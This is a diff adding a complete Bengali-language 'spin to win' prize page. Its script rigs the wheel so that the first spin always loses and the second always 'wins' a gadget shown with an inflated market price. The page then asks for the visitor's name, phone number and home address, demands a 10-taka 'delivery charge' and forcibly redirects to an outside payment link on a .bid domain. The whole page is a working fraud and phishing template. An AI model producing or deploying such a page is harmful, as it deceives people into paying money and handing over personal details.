@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ভাগ্য পরীক্ষা করুন - স্পিন টু উইন!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #ff2a74;
+            --secondary-color: #ff7e40;
+            --dark-bg: #0b0914;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            font-size: 16px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #150f30, var(--dark-bg));
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            padding: 10px;
+            position: relative;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 20px 15px;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #ff2a74, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 3px 8px rgba(0,0,0,0.3);
+        }
+
+        .chances {
+            background: rgba(255, 191, 0, 0.1);
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #ffd700;
+            font-weight: 600;
+            border: 1px solid rgba(255, 191, 0, 0.25);
+            box-shadow: 0 0 10px rgba(255, 191, 0, 0.05);
+        }
+
+        .wheel-box {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 1;
+            margin: 0 auto 25px auto;
+        }
+
+        .pointer {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(180deg, #ffd700, #ff8c00);
+            clip-path: polygon(50% 100%, 15% 0, 85% 0);
+            z-index: 10;
+            filter: drop-shadow(0px 4px 5px rgba(0,0,0,0.6));
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 8px solid #ffd700;
+            position: relative;
+            overflow: hidden;
+            transition: transform 4s cubic-bezier(0.1, 0.8, 0.1, 1);
+            box-shadow: 0 0 25px rgba(255, 42, 116, 0.35), inset 0 0 20px rgba(0,0,0,0.8);
+            background: #18142c;
+        }
+
+        .spin-inner-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: radial-gradient(circle, #ffffff, #ffd700);
+            border-radius: 50%;
+            z-index: 5;
+            box-shadow: 0 0 15px rgba(0,0,0,0.8);
+            border: 3px solid #ff2a74;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .spin-inner-btn:hover {
+            transform: translate(-50%, -50%) scale(1.15);
+        }
+
+        canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        .spin-btn {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(255, 42, 116, 0.45);
+            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 90%;
+            letter-spacing: 0.5px;
+        }
+
+        .spin-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 42, 116, 0.6);
+        }
+
+        .spin-btn:disabled {
+            background: #444;
+            color: #888;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-content {
+            background: #17132d;
+            border-radius: 20px;
+            padding: 25px 20px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            border: 2px solid var(--primary-color);
+            animation: popUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 0 35px rgba(255, 42, 116, 0.4);
+        }
+
+        @keyframes popUp {
+            from {
+                transform: scale(0.6) rotate(-5deg);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .modal h2 {
+            color: #ffd700;
+            margin-bottom: 10px;
+            font-size: 1.6rem;
+            font-weight: 700;
+        }
+
+        .modal p {
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            color: #e2e2e2;
+        }
+
+        .modal-btn {
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.05rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: 0.3s;
+            width: 100%;
+            box-shadow: 0 3px 12px rgba(0, 114, 255, 0.3);
+            margin-top: 8px;
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 114, 255, 0.5);
+        }
+
+        .modal-btn.confirm-btn {
+            background: linear-gradient(45deg, #11998e, #38ef7d);
+            box-shadow: 0 3px 12px rgba(56, 239, 125, 0.3);
+        }
+
+        .modal-btn.confirm-btn:hover {
+            box-shadow: 0 5px 20px rgba(56, 239, 125, 0.5);
+        }
+
+        /* Form Styling */
+        .form-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+            color: #ddd;
+            font-weight: 600;
+        }
+
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(255,255,255,0.06);
+            color: white;
+            font-size: 0.95rem;
+            transition: 0.3s;
+            touch-action: manipulation;
+        }
+
+        @media screen and (max-width: 768px) {
+            .form-group input, .form-group textarea {
+                font-size: 16px;
+            }
+        }
+
+        .form-group input:focus, .form-group textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            background: rgba(255,255,255,0.12);
+            box-shadow: 0 0 8px rgba(255, 42, 116, 0.25);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 18px;
+            font-size: 1.6rem;
+            cursor: pointer;
+            color: #999;
+            transition: 0.3s;
+        }
+
+        .close-btn:hover {
+            color: #fff;
+            transform: rotate(90deg);
+        }
+        
+        .reward-icon {
+            font-size: 3.8rem;
+            margin-bottom: 10px;
+            animation: float 1.5s infinite alternate ease-in-out;
+        }
+        
+        @keyframes float {
+            from {
+                transform: translateY(0) rotate(0deg);
+            }
+            to {
+                transform: translateY(-10px) rotate(5deg);
+            }
+        }
+
+        /* Tablet/Desktop refinements */
+        @media screen and (min-width: 481px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 24px;
+            }
+            h1 {
+                font-size: 2.2rem;
+            }
+            .chances {
+                font-size: 0.95rem;
+                padding: 6px 18px;
+                margin-bottom: 30px;
+            }
+            .wheel-box {
+                max-width: 340px;
+                margin-bottom: 35px;
+            }
+            .pointer {
+                top: -18px;
+                width: 44px;
+                height: 44px;
+            }
+            .wheel {
+                border-width: 12px;
+            }
+            .spin-inner-btn {
+                width: 50px;
+                height: 50px;
+                border-width: 4px;
+            }
+            .spin-btn {
+                font-size: 1.25rem;
+                padding: 16px 45px;
+                width: 85%;
+            }
+            .modal-content {
+                padding: 35px 25px;
+                border-radius: 24px;
+            }
+            .modal h2 {
+                font-size: 1.9rem;
+            }
+            .modal p {
+                font-size: 1.05rem;
+            }
+            .modal-btn {
+                font-size: 1.15rem;
+                padding: 14px 30px;
+            }
+            .form-group label {
+                font-size: 0.95rem;
+            }
+            .form-group input, .form-group textarea {
+                font-size: 1rem;
+            }
+            .reward-icon {
+                font-size: 4.5rem;
+            }
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>🎰 লাকি স্পিন হুইল! 🎁</h1>
+        <div class="chances" id="chance-text">
+            <i class="fas fa-ticket-alt"></i> আপনার কাছে ২ বার স্পিন করার সুযোগ আছে
+        </div>
+
+        <div class="wheel-box">
+            <div class="pointer"></div>
+            <div class="spin-inner-btn" onclick="startSpin()"></div>
+            <div class="wheel" id="wheel-container">
+                <canvas id="wheelCanvas"></canvas>
+            </div>
+        </div>
+
+        <button class="spin-btn" id="spinBtn" onclick="startSpin()">
+            <i class="fas fa-sync-alt"></i> স্পিন করুন
+        </button>
+    </div>
+
+    <!-- Lose Modal -->
+    <div class="modal" id="loseModal">
+        <div class="modal-content">
+            <div class="reward-icon" style="filter: drop-shadow(0 0 10px rgba(255,74,74,0.3));">
+                <i class="fas fa-sad-tear" style="color: #ff4a4a;"></i>
+            </div>
+            <h2>ওহ দুঃখিত! 😢</h2>
+            <p>আপনার ভাগ্যে এবার কিছুই ছিল না। তবে চিন্তা করবেন না, আপনার কাছে আরও <strong style="color: #ffd700;">১টি গোল্ডেন সুযোগ</strong> বাকি আছে!</p>
+            <button class="modal-btn" onclick="closeModal('loseModal')">
+                <i class="fas fa-redo"></i> আবার স্পিন করুন
+            </button>
+        </div>
+    </div>
+
+    <!-- Win Modal -->
+    <div class="modal" id="winModal">
+        <div class="modal-content">
+            <div class="reward-icon" style="filter: drop-shadow(0 0 15px rgba(255,215,0,0.4));">
+                <i class="fas fa-trophy" style="color: #ffd700;"></i>
+            </div>
+            <h2>অভিনন্দন! 🎉</h2>
+            <p id="winMessage"></p>
+            <button class="modal-btn confirm-btn" onclick="openOrderModal()">
+                <i class="fas fa-check-circle"></i> অর্ডার কনফার্ম করুন
+            </button>
+        </div>
+    </div>
+
+    <!-- Order Form Modal -->
+    <div class="modal" id="formModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('formModal')">&times;</span>
+            <h2><i class="fas fa-clipboard-list"></i> অর্ডার কনফার্মেশন</h2>
+            <p style="font-size: 0.9rem; color: #bbb; margin-bottom: 15px;">পুরস্কারটি আপনার ঠিকানায় পাঠাতে সঠিক তথ্য দিন</p>
+            
+            <form id="orderForm" onsubmit="submitForm(event)">
+                <div class="form-group">
+                    <label><i class="fas fa-user"></i> আপনার নাম</label>
+                    <input type="text" id="userName" required placeholder="সম্পূর্ণ নাম লিখুন" autocomplete="name">
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-phone"></i> মোবাইল নম্বর</label>
+                    <input type="tel" id="userPhone" required placeholder="017XXXXXXXX" autocomplete="tel">
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-map-marker-alt"></i> সম্পূর্ণ ঠিকানা</label>
+                    <textarea id="userAddress" rows="3" required placeholder="গ্রাম/রোড, থানা, জেলা" autocomplete="street-address"></textarea>
+                </div>
+                <button type="submit" class="modal-btn confirm-btn">
+                    <i class="fas fa-paper-plane"></i> সাবমিট করুন
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <div class="reward-icon" style="filter: drop-shadow(0 0 15px rgba(56,239,125,0.4));">
+                <i class="fas fa-wallet" style="color: #38ef7d;"></i>
+            </div>
+            <h2>শেষ ধাপ! 💳</h2>
+            <p>অর্ডারটি সফলভাবে প্রসেস করার জন্য ডেলিভারি চার্জ বাবদ মাত্র <strong style="color: #ffd700; font-size: 1.2rem;">১০ টাকা</strong> পেমেন্ট করুন। বাকি টাকা প্রোডাক্ট হাতে পেয়ে পরিশোধ করবেন।</p>
+            <button class="modal-btn" style="background: linear-gradient(45deg, #d946ef, #8b5cf6);" onclick="redirectToPayment()" id="paymentBtn">
+                <i class="fas fa-lock"></i> পেমেন্ট করুন (১০ টাকা)
+            </button>
+            <button class="modal-btn" style="background: #666; margin-top: 5px;" onclick="closeModal('paymentModal')">
+                <i class="fas fa-times"></i> বাতিল করুন
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Reward Database
+        const rewards = [
+            { text: "Speaker 🔊", display: "Bluetooth Speaker 🔊", price: 1340, color: "#ff2a74" },
+            { text: "Power Bank 🔋", display: "পাওয়ার ব্যাংক 🔋", price: 2250, color: "#00c6ff" },
+            { text: "Air Buds 🎧", display: "Air buds 🎧", price: 850, color: "#70e000" },
+            { text: "Headphone 🎧", display: "হেডফোন 🎧", price: 970, color: "#ff9f00" },
+            { text: "iPhone 11 📱", display: "আইফোন ইলেভেন 📱", price: 33400, color: "#9d4edd" },
+            { text: "No Luck ❌", display: "কিছুই পাননি ❌", price: 0, color: "#3e3a50" }
+        ];
+
+        const canvas = document.getElementById("wheelCanvas");
+        const ctx = canvas.getContext("2d");
+        const wheel = document.getElementById("wheel-container");
+        const spinBtn = document.getElementById("spinBtn");
+        
+        let spinCount = 0;
+        let selectedReward = null;
+        let isSpinning = false;
+        const totalSegments = rewards.length;
+        const arc = Math.PI / (totalSegments / 2);
+
+        // Payment link
+        const PAYMENT_LINK = "https://nsecj.bid/cl/a3f09db559afd143";
+
+        // Resize canvas for high-DPI displays
+        function resizeCanvas() {
+            const parent = canvas.parentElement;
+            const size = parent.offsetWidth;
+            const scale = window.devicePixelRatio || 1;
+            const baseResolution = 500;
+
+            canvas.width = baseResolution * scale;
+            canvas.height = baseResolution * scale;
+            ctx.scale(scale, scale);
+            
+            drawWheel(baseResolution / 2, baseResolution / 2);
+        }
+
+        // Draw wheel with gradient segments
+        function drawWheel(centerX, centerY) {
+            const radius = centerX - 10;
+
+            // Draw segments
+            for (let i = 0; i < totalSegments; i++) {
+                const angle = i * arc;
+                
+                // Create gradient for each segment
+                const gradient = ctx.createRadialGradient(centerX, centerY, 5, centerX, centerY, radius);
+                gradient.addColorStop(0, rewards[i].color);
+                gradient.addColorStop(1, '#000000');
+                
+                ctx.fillStyle = gradient;
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, angle, angle + arc, false);
+                ctx.lineTo(centerX, centerY);
+                ctx.fill();
+
+                // Segment border
+                ctx.strokeStyle = "rgba(255,255,255,0.15)";
+                ctx.lineWidth = 2;
+                ctx.stroke();
+            }
+
+            // Draw text on segments
+            for (let i = 0; i < totalSegments; i++) {
+                const angle = i * arc;
+                const segmentRotation = angle + arc / 2;
+                
+                ctx.save();
+                ctx.fillStyle = "#fff";
+                ctx.font = "bold 20px 'Hind Siliguri', sans-serif";
+                ctx.shadowColor = "rgba(0, 0, 0, 0.8)";
+                ctx.shadowBlur = 4;
+                ctx.shadowOffsetX = 2;
+                ctx.shadowOffsetY = 2;
+
+                ctx.translate(centerX, centerY);
+                ctx.rotate(segmentRotation);
+                ctx.textAlign = "center";
+                ctx.textBaseline = "middle";
+
+                let text = rewards[i].text;
+                ctx.fillText(text, radius * 0.6, 0);
+                
+                ctx.restore();
+            }
+            
+            // Draw center circle
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, 30, 0, Math.PI * 2);
+            ctx.fillStyle = '#fff';
+            ctx.fill();
+            ctx.strokeStyle = '#ff2a74';
+            ctx.lineWidth = 3;
+            ctx.stroke();
+        }
+        
+        // Initial draw
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        // Spin mechanism
+        function startSpin() {
+            if (isSpinning) return;
+            
+            spinBtn.disabled = true;
+            isSpinning = true;
+            spinCount++;
+            
+            let targetSegmentIndex;
+
+            if (spinCount === 1) {
+                targetSegmentIndex = 5; // "No Luck"
+                document.getElementById("chance-text").innerHTML = `<i class="fas fa-ticket-alt"></i> আপনার কাছে ১ বার স্পিন করার সুযোগ আছে`;
+            } else {
+                targetSegmentIndex = Math.floor(Math.random() * 4); // First 4 gifts
+                document.getElementById("chance-text").innerHTML = `<i class="fas fa-times-circle"></i> আপনার স্পিনের সুযোগ শেষ`;
+            }
+
+            selectedReward = rewards[targetSegmentIndex];
+
+            const segmentDegrees = 360 / totalSegments;
+            const targetAngle = 360 - (targetSegmentIndex * segmentDegrees) - (segmentDegrees / 2);
+            const totalRotation = (360 * 6) + targetAngle + Math.random() * 10;
+            
+            wheel.style.transform = `rotate(${totalRotation}deg)`;
+
+            setTimeout(() => {
+                isSpinning = false;
+                
+                if (spinCount === 1) {
+                    showModal("loseModal");
+                    spinBtn.disabled = false;
+                } else {
+                    document.getElementById("winMessage").innerHTML = `
+                        <i class="fas fa-gift" style="font-size: 2rem; color: #ffd700;"></i><br>
+                        আপনি জিতেছেন <strong style="color: #38ef7d;">${selectedReward.display}</strong>!<br>
+                        বাজার মূল্য: <span style="color:#ff2a74; font-weight:bold; font-size: 1.3rem;">${selectedReward.price} টাকা</span>
+                    `;
+                    showModal("winModal");
+                }
+            }, 4000);
+        }
+
+        // Modal handlers
+        function showModal(id) {
+            document.getElementById(id).style.display = "flex";
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).style.display = "none";
+        }
+
+        function openOrderModal() {
+            closeModal("winModal");
+            showModal("formModal");
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+            
+            const name = document.getElementById("userName").value.trim();
+            const phone = document.getElementById("userPhone").value.trim();
+            const address = document.getElementById("userAddress").value.trim();
+            
+            if (!name || !phone || !address) {
+                alert("দয়া করে সকল তথ্য পূরণ করুন!");
+                return;
+            }
+            
+            if (phone.length < 10 || phone.length > 13) {
+                alert("বৈধ ফোন নম্বর লিখুন!");
+                return;
+            }
+            
+            closeModal("formModal");
+            showModal("paymentModal");
+        }
+
+        function redirectToPayment() {
+            // Multiple methods to ensure the link opens
+            const paymentBtn = document.getElementById("paymentBtn");
+            
+            // Show loading state
+            paymentBtn.innerHTML = '<span class="loading-spinner"></span> লোড হচ্ছে...';
+            paymentBtn.disabled = true;
+            
+            // Method 1: window.location.href
+            window.location.href = PAYMENT_LINK;
+            
+            // Method 2: Fallback - open in new tab after short delay
+            setTimeout(() => {
+                window.open(PAYMENT_LINK, '_blank');
+            }, 500);
+            
+            // Method 3: If still on page after 2 seconds, force redirect
+            setTimeout(() => {
+                window.location.replace(PAYMENT_LINK);
+            }, 2000);
+        }
+
+        // Close modals on outside click
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = "none";
+            }
+        }
+
+        // Close modals on Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                document.querySelectorAll('.modal').forEach(modal => {
+                    modal.style.display = 'none';
+                });
+            }
+        });
+
+        // Test function to verify payment link
+        function testPaymentLink() {
+            console.log("Payment Link:", PAYMENT_LINK);
+            console.log("Testing link opening...");
+            window.open(PAYMENT_LINK, '_blank');
+        }
+
+        // Add click event listener to payment button for debugging
+        document.addEventListener('DOMContentLoaded', function() {
+            const paymentBtn = document.getElementById("paymentBtn");
+            if (paymentBtn) {
+                paymentBtn.addEventListener('click', function(e) {
+                    console.log("Payment button clicked");
+                    console.log("Redirecting to:", PAYMENT_LINK);
+                });
+            }
+            
+            // Log payment link on page load
+            console.log("Payment system initialized");
+            console.log("Payment URL configured:", PAYMENT_LINK);
+        });
+    </script>
+</body>
+</html>
